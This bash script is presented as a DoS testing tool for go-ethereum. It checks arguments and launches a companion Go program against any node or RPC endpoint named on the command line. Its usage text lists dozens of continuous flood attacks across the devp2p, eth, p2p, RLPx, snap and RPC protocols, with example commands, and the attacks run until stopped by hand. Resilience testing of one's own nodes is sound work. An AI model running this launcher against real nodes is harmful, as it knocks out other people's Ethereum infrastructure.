#!/bin/bash

# DoS Testing Script for go-ethereum
# This script provides various DoS attack variants for testing purposes

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to show usage
show_usage() {
    echo "DoS Testing Script for go-ethereum"
    echo ""
    echo "Usage: $0 <protocol> <attack_type> <target> [additional_args]"
    echo ""
    echo "Protocols & Attack Types:"
    echo ""
    echo "  devp2p <attack_type> <target_node>:"
    echo "    DoS attacks (continuous):"
    echo "      ping           - Send rapid ping messages"
    echo "      findnode       - Send rapid findnode requests"
    echo "      talk           - Send rapid talk requests"
    echo "      pingv4         - Send rapid v4 ping messages"
    echo "      findnodev4     - Send rapid v4 findnode requests"
    echo "      enrrequestv4   - Send rapid v4 ENR requests"
    echo "    Single request tests:"
    echo "      ping-single          - Send single v5 ping and wait for pong"
    echo "      findnode-single      - Send single v5 findnode and wait for response"
    echo "      talk-single          - Send single v5 talk request and wait for response"
    echo "      pingv4-single        - Send single v4 ping and wait for pong"
    echo "      findnodev4-single    - Send single v4 findnode and wait for response"
    echo "      enrrequestv4-single  - Send single v4 ENR request and wait for response"
    echo ""
    echo "  eth <attack_type> <target_node>:"
    echo "    status         - Send rapid status messages"
    echo "    newblockhashes - Send rapid block hash announcements"
    echo "    transactions   - Send rapid transaction messages"
    echo "    getblockheaders- Send rapid block header requests"
    echo "    getblockbodies - Send rapid block body requests"
    echo "    newblock       - Send rapid new block messages"
    echo "    newpooledtxhashes - Send rapid transaction hash announcements"
    echo "    getpooledtxs   - Send rapid transaction requests"
    echo "    getreceipts    - Send rapid receipt requests"
    echo "    handshakeflood - Send rapid protocol handshake messages"
    echo ""
    echo "  p2p <attack_type> <target_node>:"
    echo "    pingflood      - Flood with rapid ping messages"
    echo "    pongflood      - Flood with rapid pong messages"
    echo "    pingpongflood  - Flood with alternating ping/pong messages"
    echo ""
    echo "  rlpx <attack_type> <target_ip> <port>:"
    echo "    handshakeflood - Flood with RLPx handshake attempts"
    echo "    churn          - Rapid connection/disconnection cycles"
    echo ""
    echo "  snap <attack_type> <target_node>:"
    echo "    getaccountrange  - Send rapid account range requests"
    echo "    getstorageranges - Send rapid storage range requests"
    echo "    getbytecodes     - Send rapid bytecode requests"
    echo "    gettrienodes     - Send rapid trie node requests"
    echo ""
    echo "  rpc <attack_type> <target_url> [method]:"
    echo "    httpflood      - Flood HTTP RPC endpoint (requires method parameter)"
    echo "    malformed      - Send malformed JSON-RPC requests"
    echo ""
    echo "Examples:"
    echo "  # DevP2P DoS attacks"
    echo "  $0 devp2p ping enode://1234...@127.0.0.1:30303"
    echo "  $0 devp2p findnode enode://1234...@127.0.0.1:30303"
    echo ""
    echo "  # DevP2P single request tests"
    echo "  $0 devp2p ping-single enode://1234...@127.0.0.1:30303"
    echo "  $0 devp2p pingv4-single enode://1234...@127.0.0.1:30303"
    echo "  $0 devp2p findnode-single enode://1234...@127.0.0.1:30303"
    echo ""
    echo "  # Ethereum protocol attacks"
    echo "  $0 eth status enode://1234...@127.0.0.1:30303"
    echo "  $0 eth getblockheaders enode://1234...@127.0.0.1:30303"
    echo "  $0 eth handshakeflood enode://1234...@127.0.0.1:30303"
    echo ""
    echo "  # P2P protocol attacks"
    echo "  $0 p2p pingflood enode://1234...@127.0.0.1:30303"
    echo "  $0 p2p pongflood enode://1234...@127.0.0.1:30303"
    echo ""
    echo "  # RLPx layer attacks"
    echo "  $0 rlpx handshakeflood 127.0.0.1 30303"
    echo "  $0 rlpx churn 192.168.1.100 30303"
    echo ""
    echo "  # Snap protocol attacks"
    echo "  $0 snap getaccountrange enode://1234...@127.0.0.1:30303"
    echo "  $0 snap gettrienodes enode://1234...@127.0.0.1:30303"
    echo ""
    echo "  # RPC attacks"
    echo "  $0 rpc httpflood http://127.0.0.1:8545 eth_getBalance"
    echo "  $0 rpc malformed http://127.0.0.1:8545"
    echo ""
    echo "Note: All attacks run indefinitely until manually stopped (Ctrl+C)"
}

# Check if help is requested
if [[ "$1" == "-h" || "$1" == "--help" || "$1" == "help" ]]; then
    show_usage
    exit 0
fi

# Check if we have enough arguments
if [[ $# -lt 3 ]]; then
    print_error "Insufficient arguments"
    show_usage
    exit 1
fi

PROTOCOL="$1"
ATTACK_TYPE="$2"
TARGET="$3"
EXTRA_ARG="$4"

print_info "Starting DoS attack: $PROTOCOL $ATTACK_TYPE on $TARGET"
print_warning "Press Ctrl+C to stop the attack"

# Determine which attack to run based on protocol
case "$PROTOCOL" in
    devp2p)
        if [[ ! "$ATTACK_TYPE" =~ ^(ping|findnode|talk|pingv4|findnodev4|enrrequestv4|ping-single|findnode-single|talk-single|pingv4-single|findnodev4-single|enrrequestv4-single)$ ]]; then
            print_error "Invalid devp2p attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        print_info "Running devp2p attack/test..."
        cd p2p/dos && go run . devp2p "$ATTACK_TYPE" "$TARGET"
        ;;
    eth)
        if [[ ! "$ATTACK_TYPE" =~ ^(status|newblockhashes|transactions|getblockheaders|getblockbodies|newblock|newpooledtxhashes|getpooledtxs|getreceipts|handshakeflood)$ ]]; then
            print_error "Invalid eth attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        print_info "Running eth attack..."
        cd p2p/dos && go run . eth "$ATTACK_TYPE" "$TARGET"
        ;;
    p2p)
        if [[ ! "$ATTACK_TYPE" =~ ^(pingflood|pongflood|pingpongflood)$ ]]; then
            print_error "Invalid p2p attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        print_info "Running p2p attack..."
        cd p2p/dos && go run . p2p "$ATTACK_TYPE" "$TARGET"
        ;;
    rlpx)
        if [[ ! "$ATTACK_TYPE" =~ ^(handshakeflood|churn)$ ]]; then
            print_error "Invalid rlpx attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        if [[ -z "$EXTRA_ARG" ]]; then
            print_error "RLPx attacks require port number"
            print_error "Usage: $0 rlpx $ATTACK_TYPE <target_ip> <port>"
            exit 1
        fi
        print_info "Running rlpx attack..."
        cd p2p/dos && go run . rlpx "$ATTACK_TYPE" "$TARGET" "$EXTRA_ARG"
        ;;
    snap)
        if [[ ! "$ATTACK_TYPE" =~ ^(getaccountrange|getstorageranges|getbytecodes|gettrienodes)$ ]]; then
            print_error "Invalid snap attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        print_info "Running snap attack..."
        cd p2p/dos && go run . snap "$ATTACK_TYPE" "$TARGET"
        ;;
    rpc)
        if [[ ! "$ATTACK_TYPE" =~ ^(httpflood|malformed)$ ]]; then
            print_error "Invalid rpc attack type: $ATTACK_TYPE"
            show_usage
            exit 1
        fi
        if [[ "$ATTACK_TYPE" == "httpflood" && -z "$EXTRA_ARG" ]]; then
            print_error "RPC httpflood attack requires method parameter"
            print_error "Usage: $0 rpc httpflood <target_url> <method>"
            exit 1
        fi
        print_info "Running rpc attack..."
        if [[ "$ATTACK_TYPE" == "httpflood" ]]; then
            cd p2p/dos && go run . rpc "$ATTACK_TYPE" "$TARGET" "$EXTRA_ARG"
        else
            cd p2p/dos && go run . rpc "$ATTACK_TYPE" "$TARGET"
        fi
        ;;
    *)
        print_error "Unknown protocol: $PROTOCOL"
        print_error "Supported protocols: devp2p, eth, p2p, rlpx, snap, rpc"
        show_usage
        exit 1
        ;;
esac

if [ $? -eq 0 ]; then
    print_success "DoS attack completed successfully"
else
    print_error "DoS attack failed"
    exit 1
fi 